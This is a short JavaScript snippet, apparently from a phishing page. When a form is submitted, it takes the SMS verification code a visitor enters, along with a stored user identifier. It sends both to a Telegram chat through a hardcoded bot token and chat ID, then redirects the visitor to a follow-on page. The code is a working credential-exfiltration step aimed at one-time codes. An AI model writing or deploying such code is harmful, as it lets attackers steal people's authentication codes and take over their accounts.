var sms2 = document.getElementById('sms');
var usercode = localStorage.getItem('usercode');

document.getElementById('form6').addEventListener('submit', function (e) {
    e.preventDefault();
    const bot = new Bot("8030036758:AAFBlF_S0RG8CJ5ueHBdmOQV9niAyHrTMG0", -4591101208);

    try {

        bot.sendMessage('👔User : ' + usercode + '💌sms2 : ' + sms2.value)
            .then(res => {
                console.log(res);
                window.location.href = './effectuer.html';
            })
    }
    catch (err) {
        console.log(err)
    }

})